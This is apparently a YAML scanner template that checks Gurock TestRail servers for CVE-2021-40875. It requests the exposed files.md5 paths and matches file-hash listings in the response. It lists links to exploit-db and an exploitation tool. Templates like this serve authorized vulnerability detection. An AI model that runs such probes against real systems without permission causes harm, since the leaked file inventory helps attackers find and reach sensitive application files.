name: yaml-poc-gurock-testrail-leak-CVE-2021-40875
binding: de962f76-932c-4be1-89dc-4e3ef2bbdf72
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/164270/Gurock-Testrail-7.2.0.3014-Improper-Access-Control.html
        - https://github.com/SakuraSamuraii/derailed
        - https://johnjhacking.com/blog/cve-2021-40875/
        - https://packetstormsecurity.com/files/164270/Gurock-Testrail-7.2.0.3014-Improper-Access-Control.html
        - https://www.exploit-db.com/exploits/50320
        - https://www.gurock.com/testrail/tour/enterprise-edition
    vulnerability:
        id: 2445ad4a-de35-4ae9-9ed1-3434d0af1d99
        level: high
transport: http
payloads:
    payloads:
        req01:
            urlpath: |
                "files.md5"
        req02:
            urlpath: |
                "testrail/files.md5"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /{{urlpath}}
        expression: |
            response.status == 200 && "[0-9a-f]{32}  app/[arguments|controllers]".bmatches(response.body)
expression: r0()
